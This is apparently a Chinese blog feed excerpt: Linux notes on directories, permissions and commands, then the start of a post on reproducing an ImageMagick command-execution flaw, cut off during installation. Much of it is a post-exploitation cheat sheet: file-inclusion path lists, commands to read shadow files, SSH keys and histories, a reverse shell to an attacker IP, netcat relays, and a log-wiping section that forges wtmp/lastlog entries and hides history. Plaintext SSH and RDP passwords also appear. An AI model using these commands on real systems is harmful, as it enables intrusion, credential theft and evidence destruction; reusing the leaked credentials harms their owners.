这个目录是使用标准的ext2/ext3文件系统格式才会产生的一个目录，目的在二当文件系统发生错误时， 将一些遗失的片段放置到这个目录下。这个目录通常会在分割槽的最顶层存在， 例如你加装一颗硬盘于/disk中，那在这个系统下就会自动产生一个这样的目录『/disk/lost+found』/proc 他放置的数据都是在内存当中， 例如系统核心、行程信息(process)、周边装置的状态及网络状态等等。因为这个目录下的数据都是在内存当中， 所以本身不占任何硬盘空间啊！比较重要的档案例如：/proc/cpuinfo, /proc/dma, /proc/interrupts, /proc/ioports, / proc/net/* 等等。/sys 这个目录其实跟/proc非常类似，也是一个虚拟的文件系统，主要也是记录不核心相关的信息。 包括目前已加载的核心模块不核心侦测到的硬件装置信息等等。这个目录同样不占硬盘容量喔！/sbin 重要的系统执行文件 常见路径Linux 系统下的一些常见路径： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147/etc/passwd/etc/shadow/etc/fstab/etc/host.conf/etc/motd/etc/ld.so.conf/var/www/htdocs/index.php/var/www/conf/httpd.conf/var/www/htdocs/index.html/var/httpd/conf/php.ini/var/httpd/htdocs/index.php/var/httpd/conf/httpd.conf/var/httpd/htdocs/index.html/var/httpd/conf/php.ini/var/www/index.html/var/www/index.php/opt/www/conf/httpd.conf/opt/www/htdocs/index.php/opt/www/htdocs/index.html/usr/local/apache/htdocs/index.html/usr/local/apache/htdocs/index.php/usr/local/apache2/htdocs/index.html/usr/local/apache2/htdocs/index.php/usr/local/httpd2.2/htdocs/index.php/usr/local/httpd2.2/htdocs/index.html/tmp/apache/htdocs/index.html/tmp/apache/htdocs/index.php/etc/httpd/htdocs/index.php/etc/httpd/conf/httpd.conf/etc/httpd/htdocs/index.html/www/php/php.ini/www/php4/php.ini/www/php5/php.ini/www/conf/httpd.conf/www/htdocs/index.php/www/htdocs/index.html/usr/local/httpd/conf/httpd.conf/apache/apache/conf/httpd.conf/apache/apache2/conf/httpd.conf/etc/apache/apache.conf/etc/apache2/apache.conf/etc/apache/httpd.conf/etc/apache2/httpd.conf/etc/apache2/vhosts.d/00_default_vhost.conf/etc/apache2/sites-available/default/etc/phpmyadmin/config.inc.php/etc/mysql/my.cnf/etc/httpd/conf.d/php.conf/etc/httpd/conf.d/httpd.conf/etc/httpd/logs/error_log/etc/httpd/logs/error.log/etc/httpd/logs/access_log/etc/httpd/logs/access.log/home/apache/conf/httpd.conf/home/apache2/conf/httpd.conf/var/log/apache/error_log/var/log/apache/error.log/var/log/apache/access_log/var/log/apache/access.log/var/log/apache2/error_log/var/log/apache2/error.log/var/log/apache2/access_log/var/log/apache2/access.log/var/www/logs/error_log/var/www/logs/error.log/var/www/logs/access_log/var/www/logs/access.log/usr/local/apache/logs/error_log/usr/local/apache/logs/error.log/usr/local/apache/logs/access_log/usr/local/apache/logs/access.log/var/log/error_log/var/log/error.log/var/log/access_log/var/log/access.log/usr/local/apache/logs/access_logaccess_log.old/usr/local/apache/logs/error_logerror_log.old/etc/php.ini/bin/php.ini/etc/init.d/httpd/etc/init.d/mysql/etc/httpd/php.ini/usr/lib/php.ini/usr/lib/php/php.ini/usr/local/etc/php.ini/usr/local/lib/php.ini/usr/local/php/lib/php.ini/usr/local/php4/lib/php.ini/usr/local/php4/php.ini/usr/local/php4/lib/php.ini/usr/local/php5/lib/php.ini/usr/local/php5/etc/php.ini/usr/local/php5/php5.ini/usr/local/apache/conf/php.ini/usr/local/apache/conf/httpd.conf/usr/local/apache2/conf/httpd.conf/usr/local/apache2/conf/php.ini/etc/php4.4/fcgi/php.ini/etc/php4/apache/php.ini/etc/php4/apache2/php.ini/etc/php5/apache/php.ini/etc/php5/apache2/php.ini/etc/php/php.ini/etc/php/php4/php.ini/etc/php/apache/php.ini/etc/php/apache2/php.ini/web/conf/php.ini/usr/local/Zend/etc/php.ini/opt/xampp/etc/php.ini/var/local/www/conf/php.ini/var/local/www/conf/httpd.conf/etc/php/cgi/php.ini/etc/php4/cgi/php.ini/etc/php5/cgi/php.ini/php5/php.ini/php4/php.ini/php/php.ini/PHP/php.ini/apache/php/php.ini/xampp/apache/bin/php.ini/xampp/apache/conf/httpd.conf/NetServer/bin/stable/apache/php.ini/home2/bin/stable/apache/php.ini/home/bin/stable/apache/php.ini/var/log/mysql/mysql-bin.log/var/log/mysql.log/var/log/mysqlderror.log/var/log/mysql/mysql.log/var/log/mysql/mysql-slow.log/var/mysql.log/var/lib/mysql/my.cnf/usr/local/mysql/my.cnf/usr/local/mysql/bin/mysql/etc/mysql/my.cnf/etc/my.cnf/usr/local/cpanel/logs/usr/local/cpanel/logs/stats_log/usr/local/cpanel/logs/access_log/usr/local/cpanel/logs/error_log/usr/local/cpanel/logs/license_log/usr/local/cpanel/logs/login_log/usr/local/cpanel/logs/stats_log/usr/local/share/examples/php4/php.ini/usr/local/share/examples/php/php.ini/usr/local/tomcat5527/bin/version.sh/usr/share/tomcat6/bin/startup.sh/usr/tomcat6/bin/startup.sh 开机流程简单的说，整个开机流程到操作系统之前的动作应该是这样的： BIOS：开机主动执行的韧体，会认识第一个可开机的装置； MBR：第一个可开机装置的第一个扇区内的主要启动记录区块，内吨开机管理程序； 开机管理程序(boot loader)：一支可读叏核心档案来执行的软件； 核心档案：开始操作系统的功能… 文件属性123456789101112drwxr-xr-x 16 root root 4096 Aug 6 22:01 ImageMagick[ 权限 ] [连结] [拥有者] [群组][档案容量] [ 修改日期 ] [ 文件名 ] d rwx r-x r-x[ 文件类型 ] [ 文件拥有者 ] [ 文件所属组 ] [ 其他人权限 ]第一个字符代表这个档案是『目录、档案或链接文件等等』：* 当为[ d ]则是目录，例如上表档名为『.gconf』的那一行；* 当为[ - ]则是档案，例如上表档名为『install.log』那一行；* 若是[ l ]则表示为连结档(link file)；* 若是[ b ]则表示为装置文件里面的可供储存的接口讴备(可随机存取装置)；* 若是[ c ]则表示为装置文件里面的串行端口讴备，例如键盘、鼠标(一次性读取装置)。 权限对目录的重要性可读表示具有读取目录结构列表的权限，所以当你具有读取(r)一个目录的权限时，表示你可以查询该目录下的文件名数据。 所以你就可以利用 ls 这个指令将该目录的内容列表显示出来！ 可写这个可写入的权限对目录来说，是很里不起起的！ 因为他表示你具有移动该目录结构列表的权限，也就是底下这些权限： 建立新的档案与目录； 删除已经存在的档案与目录(不论该档案的权限为何！) 将已存在的档案或目录进行更名； 搬移该目录内的档案、目录位置。总之，目录的w权限就与该目录底下的文件名异动有关就对了啦！ 执行目录只是记录文件名而已，总不能拿来执行吧？没错！目录不可以被执行，目录的x代表的是用户能否迚入该目录成为工作目录的用途！所谓的工作目录(work directory)就是你目前所在的目录啦！举例来说，当你登入Linux时， 你所在的家目录就是你当下的工作目录。而变换目录的命令是『cd』(change directory)啰！ 工作目录对于指令的执行是非常重要的，如果你在某目录下不具有x的权限， 那么你就无法切换到该目录下，也就无法执行该目录下的任何指令，即使你具有该目录的r的权限。 文件名限制在Linux底下，使用预设的Ext2/Ext3文件系统时，针对档案的档名长度限制为： 单一档案或目录的最大容许文件名为 255 个字符； 包函完整路径名称及目录 (/) 的完整档名为 4096 个字符。以及避免一些特殊字符比较好！例如底下这些：1* ? &gt; &lt; ; &amp; ! [ ] | \ &apos; &quot; ` ( ) &#123; &#125; 常用指令基础指令123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960date 显示日期cal 显示日历bc 计算器[Ctrl]-c 中断目前程序[Ctrl]-d 取代exit的输入info 指令说明man 指令说明whatis 指令说明shutdown 关机reboot 重启halt 重启poweroff 重启init 系统运作的模式 init 0 关机chgrp 改变档案所属群组chown 改变档案拥有者chmod 改变档案的权限, SUID, SGID, SBIT等等的特权cd 变换目录pwd 显示弼前目录mkdir 建立一个新的目录rmdir 删除一个空的目录cp (复制档案或目录)rm (移除档案或目录)mv (移动档案与目录，或更名)cat 由第一行开始显示档案内容tac 从最后一行开始显示，可以看出 tac 是 cat 的倒着写！nl 显示的时候，顺道输出行号！more 一页一页的显示档案内容less 不 more 类似，但是比 more 更好的是，他可以往前翻页！head 叧看头几行tail 叧看尾巳几行od 以二迚制的方式读取档案内容！touch 修改档案时间或建置新档umask 档案预设权限chattr (配置文件案隐藏属性) lsattr (显示档案隐藏属性) file 观察文件类型which (寻找『执行档』)whereis (寻找特定档案)locate 这是因为 locate 寻找的数据是由『已建立的数据库 /var/lib/mlocate/』 里面大的数据所搜寻到的，所以不用直接在去硬盘弼中存取数据find 不过由亍 find 在寻找数据得时后相当的操硬盘tar 压 缩：tar -jcv -f filename.tar.bz2 要被压缩的档案或目录名称 查 询：tar -jtv -f filename.tar.bz2 解压缩：tar -jxv -f filename.tar.bz2 -C 欲解压缩的目录type Bash shell 的内建命令grep 搜索指定字符串kill 杀死进程 ps 将某个时间点的程序运作情况撷取下来top 动态观察程序的变化pstree 查到程序相关性free 观察内存使用情况uname 查阅系统与核心相关信息uptime 观察系统启动时间与工作负载netstat 追踪网络或插槽文件vmstat 侦测系统资源变化lsof 列出被程序所开启的档案文件名pidof ：找出某支正在执行的程序的 PID 常用指令系统管理 fdisk fdisk -l 查看系统分区信息 fdisk fdisk /dev/sdb 为一块新的SCSI硬盘进行分区 chown chown root /home 把/home的属主改成root用户 chgrp chgrp root /home 把/home的属组改成root组 useradd 创建一个新的用户 groupadd 组名 创建一个新的组 passwd 用户名 为用户创建密码 passwd -d用户名 删除用户密码也能登陆 passwd -S用户名 查询账号密码 usermod -l 新用户名 老用户名 为用户改名 userdel–r 用户名 删除用户一切 service [servicename] start/stop/restart 系统服务控制操作 /etc/init.d/[servicename] start/stop/restart 系统服务控制操作# xshell上传下载： sudo apt-get instal lrzsz 上传：rz -E 下载：sz# ssh 22： sudo apt-get install openssh-server 开启：sudo /etc/init.d/ssh restart# mysql开启远程连接： mysql -u root -p use mysql GRANT ALL PRIVILEGES ON *.* TO &apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;123456&apos; WITH GRANT OPTION; flush privileges;# find 命令： find .|xargs grep -ri &quot;IBM&quot; 查找目录下的所有文件中是否含有某个字符串,并且只打印出文件名 find /opt/ -name &quot;MyCProgram.c&quot; 用文件名查找文件 find /opt/ -iname &quot;MyCProgram.c&quot; 用文件名查找文件，忽略大小写 find /opt/ -maxdepth 3 -iname &quot;passwd&quot; 在opt目录下及其最大三层深度的子目录中查找passwd文件 find /opt/ -maxdepth 3 -iname &quot;SBLF.php&quot; -exec cat &#123;&#125; \ 查找文件并查看 find /opt/ -not -iname &quot;MyCProgram.c&quot; 相反匹配 find /opt/ -perm 755 -type f -exec ls -l &#123;&#125; \; 查找opt目录下755权限的文件并执行ls -l find /opt/ -empty 查找所有的空文件 find /opt/lampp/htdocs/ -newer /opt/lampp/htdocs/Trojan/lqx.php 查找在指定文件时间之后做了修改的文件# 远程链接 1).linux ssh ubuntu@115.159.50.234 密码:8KX3OuQkBhDRvE7 2).windows rdesktop 115.159.100.36 -u Administrator -p 3GCGc7OoRn0kpMY7# 设置软连接 ln -s /usr/local/nginx/logs/access.log nginx_access.log# make编译 make 编译 make install 安装编译好的源码包# apt命令 apt-cache search package 搜索包 apt-cache show package 获取包的相关信息，如说明、大小、版本等 sudo apt-get install package 安装包 sudo apt-get install package - - reinstall 重新安装包 sudo apt-get -f install 修复安装”-f = –fix-missing” sudo apt-get remove package 删除包 sudo apt-get remove package - - purge 删除包，包括删除配置文件等 sudo apt-get update 更新源 sudo apt-get upgrade 更新已安装的包 sudo apt-get dist-upgrade 升级系统 sudo apt-get dselect-upgrade 使用 dselect 升级 apt-cache depends package 了解使用依赖 apt-cache rdepends package 是查看该包被哪些包依赖 sudo apt-get build-dep package 安装相关的编译环境 apt-get source package 下载该包的源代码 sudo apt-get clean &amp;&amp; sudo apt-get autoclean 清理无用的包 sudo apt-get check 检查是否有损坏的依赖 sudo apt-get clean 清理所有软件缓存（即缓存在/var/cache/apt/archives目录里的deb包） sudo apt-get autoremove 删除系统不再使用的孤立软件 apt-get -qq –print-uris install ssh | cut -d\’ -f2 查看包在服务器上面的地址# 清除所以删除包的残余配置文件 dpkg -l |grep ^rc|awk ‘&#123;print $2&#125;’ |tr [&quot;\n&quot;] [&quot; “]|sudo xargs dpkg -P -# 查看安装软件时下载包的临时存放目录 ls /var/cache/apt/archives# 备份当前系统安装的所有包的列表 dpkg –get-selections | grep -v deinstall &gt; ~/somefile# 从上面备份的安装包的列表文件恢复所有包 dpkg –set-selections &lt; ~/somefile sudo dselect# 查看内核 uname -a# 查看Ubuntu版本 cat /etc/issue# 查看内核加载的模块 lsmod# 查看PCI设备 lspci# 查看USB设备 lsusb# 查看网卡状态 sudo ethtool eth0# 查看CPU信息 cat /proc/cpuinfo# 显示当前硬件信息 lshw# 查看硬盘的分区 sudo fdisk -l# 查看IDE硬盘信息 sudo hdparm -i /dev/hda# 查看STAT硬盘信息 sudo hdparm -I /dev/sda sudo blktool /dev/sda id# 如果你想在当前目录下 查找&quot;hello,world!&quot;字符串,可以这样:grep -rn &quot;hello,world!&quot; ** : 表示当前目录所有文件，也可以是某个文件名-r 是递归查找-n 是显示行号-R 查找所有文件包含子目录-i 忽略大小写下面是一些有意思的命令行参数：grep -i pattern files ：不区分大小写地搜索。默认情况区分大小写，grep -l pattern files ：只列出匹配的文件名，grep -L pattern files ：列出不匹配的文件名，grep -w pattern files ：只匹配整个单词，而不是字符串的一部分（如匹配‘magic’，而不是‘magical’），grep -C number pattern files ：匹配的上下文分别显示[number]行，grep pattern1 | pattern2 files ：显示匹配 pattern1 或 pattern2 的行，grep pattern1 files | grep pattern2 ：显示既匹配 pattern1 又匹配 pattern2 的行。这里还有些用于搜索的特殊符号：\&lt; 和 \&gt; 分别标注单词的开始与结尾。例如：grep man * 会匹配 ‘Batman’、‘manic’、‘man’等，grep &apos;\&lt;man&apos; * 匹配‘manic’和‘man’，但不是‘Batman’，grep &apos;\&lt;man\&gt;&apos; 只匹配‘man’，而不是‘Batman’或‘manic’等其他的字符串。&apos;^&apos;：指匹配的字符串在行首，&apos;$&apos;：指匹配的字符串在行尾， xargs配合grep查找find -type f -name &apos;*.php&apos;|xargs grep &apos;GroupRecord&apos;``## 信息收集``` bash 系统是什么版本?cat /etc/issuecat /etc/*-releasecat /etc/lsb-releasecat /etc/redhat-release它的内核版本是什么？cat /proc/version uname -auname -mrsrpm -q kerneldmesg | grep Linuxls /boot | grep vmlinuz它的环境变量里有些什么？cat /etc/profilecat /etc/bashrccat ~/.bash_profilecat ~/.bashrccat ~/.bash_logoutenvset是否有台打印机？lpstat -a应用与服务查看进程打开的文件lsof -p正在运行什么服务？什么样的服务具有什么用户权限？ps auxps -eftopcat /etc/service哪些服务具有root的权限？这些服务里你看起来那些有漏洞,进行再次检查！ps aux | grep rootps -ef | grep root安装了哪些应用程序？他们是什么版本？哪些是当前正在运行的？ls -alh /usr/bin/ls -alh /sbin/dpkg -lrpm -qals -alh /var/cache/apt/archivesOls -alh /var/cache/yum/Service设置，有任何的错误配置吗？是否有任何（脆弱的）的插件？cat /etc/syslog.confcat /etc/chttp.confcat /etc/lighttpd.confcat /etc/cups/cupsd.confcat /etc/inetd.confcat /etc/apache2/apache2.confcat /etc/my.confcat /etc/httpd/conf/httpd.confcat /opt/lampp/etc/httpd.confls -aRl /etc/ | awk ‘$1 ~ /^.*r.*/主机上有哪些工作计划？crontab -lls -alh /var/spool/cronls -al /etc/ | grep cronls -al /etc/cron*cat /etc/cron*cat /etc/at.allowcat /etc/at.denycat /etc/cron.allowcat /etc/cron.denycat /etc/crontabcat /etc/anacrontabcat /var/spool/cron/crontabs/root主机上可能有哪些纯文本用户名和密码?grep -i user [filename]grep -i pass [filename]grep -C 5 &quot;password&quot; [filename]find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla通信与网络NIC(s)，系统有哪些？它是连接到哪一个网络？/sbin/ifconfig -acat /etc/network/interfacescat /etc/sysconfig/network网络配置设置是什么？网络中有什么样的服务器？DHCP服务器？DNS服务器？网关？cat /etc/resolv.confcat /etc/sysconfig/networkcat /etc/networksiptables -Lhostnamednsdomainname其他用户主机与系统的通信？lsof -ilsof -i :80grep 80 /etc/servicesnetstat -antupnetstat -antpxnetstat -tulpnchkconfig --listchkconfig --list | grep 3:onlastw缓存？IP和/或MAC地址?arp -eroute/sbin/route -nee数据包可能嗅探吗？可以看出什么？监听流量$ tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]$ tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21你如何get一个shell？你如何与系统进行交互？# http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/nc -lvp 4444 # Attacker. 输入 (命令)nc -lvp 4445 # Attacker. 输出(结果)telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445 # 在目标系统上. 使用 攻击者的IP!如何端口转发？（端口重定向）# rinetd# http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch# fpipe# FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]FPipe.exe -l 80 -r 80 -s 80 192.168.1.7# ssh# ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]ssh -L 8080:127.0.0.1:80 root@192.168.1.7 # Local Portssh -R 8080:127.0.0.1:80 root@192.168.1.7 # Remote Port#mknod# mknod backpipe p ; nc -l -p [remote port] &lt; backpipe | nc [local IP] [local port] &gt;backpipemknod backpipe p ; nc -l -p 8080 &lt; backpipe | nc 10.1.1.251 80 &gt;backpipe # Port Relaymknod backpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1&gt;backpipe # Proxy (Port 80 to 8080)mknodbackpipe p ; nc -l -p 8080 0 &amp; &lt; backpipe | tee -a inflow | nclocalhost 80 | tee -a outflow &amp; 1&gt;backpipe # Proxy monitor (Port 80 to 8080)建立隧道可能吗？本地，远程发送命令ssh -D 127.0.0.1:9050 -N [username]@[ip]proxychains ifconfigmm信息和用户你是谁？哪个id登录？谁已经登录？还有谁在这里？谁可以做什么呢？idwhowlastcat /etc/passwd | cut -d: # List of usersgrep -v -E &quot;^#&quot; /etc/passwd | awk -F: &amp;#039;$3 == 0 &#123; print $1&#125;&apos; # List of super usersawk -F: &apos;($3 == &quot;0&quot;) &#123;print&#125;&amp;#039; /etc/passwd # List of super userscat /etc/sudoerssudo -l可以找到什么敏感文件？cat /etc/passwdcat /etc/groupcat /etc/shadowls -alh /var/mail/什么有趣的文件在home/directorie（S）里？如果有权限访问ls -ahlR /root/ls -ahlR /home/是否有任何密码，脚本，数据库，配置文件或日志文件？密码默认路径和位置cat /var/apache2/config.inccat /var/lib/mysql/mysql/user.MYDcat /root/anaconda-ks.cfg用户做过什么？是否有任何密码呢？他们有没有编辑什么？cat ~/.bash_historycat ~/.nano_historycat ~/.atftp_historycat ~/.mysql_historycat ~/.php_history可以找到什么样的用户信息cat ~/.bashrccat ~/.profilecat /var/mail/rootcat /var/spool/mail/rootprivate-key 信息能否被发现？cat ~/.ssh/authorized_keyscat ~/.ssh/identity.pubcat ~/.ssh/identitycat ~/.ssh/id_rsa.pubcat ~/.ssh/id_rsacat ~/.ssh/id_dsa.pubcat ~/.ssh/id_dsacat /etc/ssh/ssh_configcat /etc/ssh/sshd_configcat /etc/ssh/ssh_host_dsa_key.pubcat /etc/ssh/ssh_host_dsa_keycat /etc/ssh/ssh_host_rsa_key.pubcat /etc/ssh/ssh_host_rsa_keycat /etc/ssh/ssh_host_key.pubcat /etc/ssh/ssh_host_key文件系统哪些用户可以写配置文件在/ etc /？能够重新配置服务？ls -aRl /etc/ | awk ‘$1 ~ /^.*w.*/&apos; 2&gt;/dev/null # Anyonels -aRl /etc/ | awk ’$1 ~ /^..w/&apos; 2&gt;/dev/null # Ownerls -aRl /etc/ | awk ‘$1 ~ /^.....w/&apos; 2&gt;/dev/null # Groupls -aRl /etc/ | awk ’;$1 ~ /w.$/&apos; 2&gt;/dev/null # Otherfind /etc/ -readable -type f 2&gt;/dev/null # Anyonefind /etc/ -readable -type f -maxdepth 1 2&gt;/dev/null # Anyone在/ var /有什么可以发现？ls -alh /var/logls -alh /var/maills -alh /var/spoolls -alh /var/spool/lpdls -alh /var/lib/pgsqlls -alh /var/lib/mysqlcat /var/lib/dhcp3/dhclient.leases网站上的任何隐藏配置/文件?配置文件与数据库信息？ls -alhR /var/www/ls -alhR /srv/www/htdocs/ls -alhR /usr/local/www/apache22/data/ls -alhR /opt/lampp/htdocs/ls -alhR /var/www/html/有什么在日志文件里?（什么能够帮助到“本地文件包含”?)# http://www.thegeekstuff.com/2011/08/linux-var-log-files/cat /etc/httpd/logs/access_logcat /etc/httpd/logs/access.logcat /etc/httpd/logs/error_logcat /etc/httpd/logs/error.logcat /var/log/apache2/access_logcat /var/log/apache2/access.logcat /var/log/apache2/error_logcat /var/log/apache2/error.logcat /var/log/apache/access_logcat /var/log/apache/access.logcat /var/log/auth.logcat /var/log/chttp.logcat /var/log/cups/error_logcat /var/log/dpkg.logcat /var/log/faillogcat /var/log/httpd/access_logcat /var/log/httpd/access.logcat /var/log/httpd/error_logcat /var/log/httpd/error.logcat /var/log/lastlogcat /var/log/lighttpd/access.logcat /var/log/lighttpd/error.logcat /var/log/lighttpd/lighttpd.access.logcat /var/log/lighttpd/lighttpd.error.logcat /var/log/messagescat /var/log/securecat /var/log/syslogcat /var/log/wtmpcat /var/log/xferlogcat /var/log/yum.logcat /var/run/utmpcat /var/webmin/miniserv.logcat /var/www/logs/access_logcat /var/www/logs/access.logls -alh /var/lib/dhcp3/ls -alh /var/log/postgresql/ls -alh /var/log/proftpd/ls -alh /var/log/samba/#auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info,mail.log, mail.warn, messages, syslog, udev, wtmp(有什么文件?log.系统引导……)如果命令限制，你可以打出哪些突破它的限制？python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;echo os.system(&apos;/bin/bash&apos;)/bin/sh -i如何安装文件系统？mountdf -h是否有挂载的文件系统？cat /etc/fstab什么是高级Linux文件权限使用？Sticky bits, SUID 和GUIDfind / -perm -1000 -type d 2&gt;/dev/null # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename herefind / -perm -g=s -type f 2&gt;/dev/null # SGID (chmod 2000) - run as the group, not the user who started it.find / -perm -u=s -type f 2&gt;/dev/null # SUID (chmod 4000) - run as the owner, not the user who started it.find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null # SGID or SUIDfor i in `locate -r &quot;bin$&quot;`; do find $i ( -perm -4000 -o -perm -2000 ) -type f 2&gt;/dev/null; done #Looks in &amp;#039;common&amp;#039; places: /bin, /sbin, /usr/bin, /usr/sbin,/usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID(Quicker search)#findstarting at root (/), SGIDorSUID, not Symbolic links, only 3folders deep, list with more detail and hideany errors (e.g. permissiondenied)find/-perm -g=s-o-perm -4000! -type l-maxdepth 3 -exec ls -ld &#123;&#125; ;2&gt;/dev/null在哪些目录可以写入和执行呢？几个“共同”的目录：/ tmp目录，/var / tmp目录/ dev /shm目录find / -writable -type d 2&gt;/dev/null # world-writeable foldersfind / -perm -222 -type d 2&gt;/dev/null # world-writeable foldersfind / -perm -o+w -type d 2&gt;/dev/null # world-writeable foldersfind / -perm -o+x -type d 2&gt;/dev/null # world-executable foldersfind / ( -perm -o+w -perm -o+x ) -type d 2&gt;/dev/null # world-writeable &amp; executable foldersAny &quot;problem&quot; files？可写的的，“没有使用&quot;的文件find / -xdev -type d ( -perm -0002 -a ! -perm -1000 ) -print # world-writeable filesfind /dir -xdev ( -nouser -o -nogroup ) -print # Noowner files准备和查找漏洞利用代码安装了什么开发工具/语言/支持？find / -name perl*find / -name python*find / -name gcc*find / -name cc如何上传文件？find / -name wgetfind / -name nc*find / -name netcat*find / -name tftp*find / -name ftp 安全检查123456789101112131415161718192021222324252627282930313233# 查看指定端口的pid netstat -antup | grep 5001# 杀死指定pid 进程 kill -9 12312# 创建新用户 orleven$ useradd orleven# 新用户允许使用sudo$ chmod u+w /etc/sudoers$ vi /etc/sudoers 找到这行 root ALL=(ALL:ALL) ALL,在他下面添加xxx ALL=(ALL) ALL (这里的xxx是你的用户名)$ chmod u-w /etc/sudoers# 生产机器禁止ROOT远程SSH登录：$ vi /etc/ssh/sshd_config PermitRootLogin no$ service sshd restart# 设置允许远程登录$ vi /etc/ssh/sshd_config AllowUsers orleven$ service sshd restart# 系统怎么打内核，操作系统，所有应用程序，插件和Web服务的最新补丁？$ apt-get update &amp;&amp; apt-get upgrade$ yum update# 查看进程： ps -e | grep ssh ps -e -o &apos;%C : %p : %z : %a&apos;|sort -k5 -nr 按内存从大到小排列 ps -e -o &apos;%C : %p : %z : %a&apos;|sort -nr 按cpu利用率从大到小排列 这里附上一个网传的Linux安全检查脚本 清除日志12345678910111213141516171819202122232425262728293031323334353637383940414243登录后执行下面命令,不记录历史命令(.bash_history)unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0last命令结果修改ip(如果修改用户什么的,自己修改下把)Centosutmpdump /var/log/wtmp |sed "s/8.8.8.8/1.1.1.1/g" |utmpdump -r &gt;/tmp/wtmp1 &amp;&amp;\mv /tmp/wtmp1 /var/log/wtmpunix/usr/lib/acct/fwtmp &lt; /var/adm/wtmpx | sed "s/192.168.8.88/localhost/g" | /usr/lib/acct/fwtmp -ic &gt; /var/adm/wtmpxlastlog 修改替换sed -i 's/192.168.1.1/8.8.8.8/' /var/log/lastlog不记录ssh公钥在本地.ssh目录中ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i多次覆盖文件，使得即使是昂贵的硬件探测仪器也难以将数据复原 -n, --iterations=N 覆盖N 次，而非使用默认的3 次。shred -n 31337 -z -u filename-n, --iterations=N 覆盖N 次，而非使用默认的3 次-z, --zero 最后一次使用0 进行覆盖以隐藏覆盖动作-u, --remove 覆盖后截断并删除文件登录账户 w下管理员是看不到的ssh -T somebody@8.8.8.8 /bin/bash –i日志文件/var/log/message 系统启动后的信息和错误日志，是Red Hat Linux中最常用的日志之一/var/log/secure 与安全相关的日志信息/var/log/maillog 与邮件相关的日志信息/var/log/cron 与定时任务相关的日志信息/var/log/spooler 与UUCP和news设备相关的日志信息/var/log/boot.log 守护进程启动和停止相关的日志消息/var/log/btmp – 记录所有失败登录信息 命令:lastb/var/log/auth.log 系统授权信息，包括用户登录和使用的权限机制等 (debian)删除部分日志,比如以当天日期或者自己的登录ipsed -i '/当前时间/'d /var/log/messages 个人建议登录linux,使用winscp工具连接,选择sftp协议,执行命令或者操作目录文件,在history,lastlog,last,w下不会有记录,但是在/var/log/secure会有sftp连接记录,只需要清理登录日志就可以了]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 安装 ImageMagick 以及命令执行漏洞复现]]></title>
    <url>%2F2016%2F12%2F01%2FimageMagick-linux-code-execution%2F</url>
    <content type="text"><![CDATA[概述最近刚出了ImageMagick命令执行漏洞，于是复现了一波，结果安装过程遇到了不少麻烦，特地记录下。 安装123456tar -vxjf ImageMagick-6.9.5-3.tar.bz2 cd ImageMagick-6.9.5-3./configure --prefix=/opt/bokee/ImageMagick --enable-share --enable-staticmakemake installvim ~/.bash_profile 输入 1234PATH=$PATH:/opt/bokee/ImageMagick/binexport LD_LIBRARY_PATH=:/opt/bokee/soft/JMagick-6.2.6/lib:/opt/bokee/ImageMagick/libexport DYLD_LIBRARY_PATH=:/opt/bokee/soft/JMagick-6.2.6/lib:/opt/bokee/ImageMagick/libexport PATH 12source ~/.bash_profileconvert -version 这样就安装完毕了ImageMagick，下面安装php扩展 12345678910111213wget http://pecl.php.net/get/imagick-3.1.2.tgztar zxvf imagick-3.1.2.tgzcd imagick-3.1.2/opt/lampp/bin/phpize # 据自己的情况找到这个文件运行 find / -name phpizeexport PKG_CONFIG_PATH=/opt/bokee/ImageMagick/lib/pkgconfig/export C_INCLUDE_PATH=$C_INCLUDE_PATH:/opt/bokee/ImageMagick/include/ImageMagick-6/./configure --with-imagick=/opt/bokee/ImageMagickmakemake installldconfigfind / -name php.inivi /opt/lampp/etc/php.ini添加：extension = "imagick.so" 错误以及解决方法运行/usr/local/webserver/php/bin/phpize时出现： 123456Configuring for:PHP Api Version: 20041225Zend Module Api No: 20060613Zend Extension Api No: 220060519Cannot find autoconf. Please check your autoconf installation and the$PHP_AUTOCONF environment variable. Then, rerun this script. 解决方法： 12345678910cd /usr/srcwget http://ftp.gnu.org/gnu/m4/m4-1.4.9.tar.gztar -zvxf m4-1.4.9.tar.gzcd m4-1.4.9/./configure &amp;&amp; make &amp;&amp; make installcd ../wget http://ftp.gnu.org/gnu/autoconf/autoconf-2.62.tar.gztar -zvxf autoconf-2.62.tar.gzcd autoconf-2.62/./configure &amp;&amp; make &amp;&amp; make install 如果出现如下错误： 1configure: error: Cannot find php-config. Please use --with-php-config=PATH 解决方法： 12find / -name php-config./configure --with-php-config=/opt/lampp/bin/php-config --with-imagick=/opt/bokee/ImageMagick 如果出现如下错误： 1wand/MagickWand.h: No such file or directory 解决方法： 1export C_INCLUDE_PATH=$C_INCLUDE_PATH:/opt/bokee/ImageMagick/include/ImageMagick-6/ 如果出现如下错误： 1XAMPP is currently only availably as 32 bit application. Please use a 32 bit compatibility library for your system. 解决方法： 1234567891011121314vi /opt/lampp/lampp# XAMPP is currently 32 bit only#case `uname -m` in# *_64)# if /opt/lampp/bin/php -v &gt; /dev/null 2&gt;&amp;1# then# 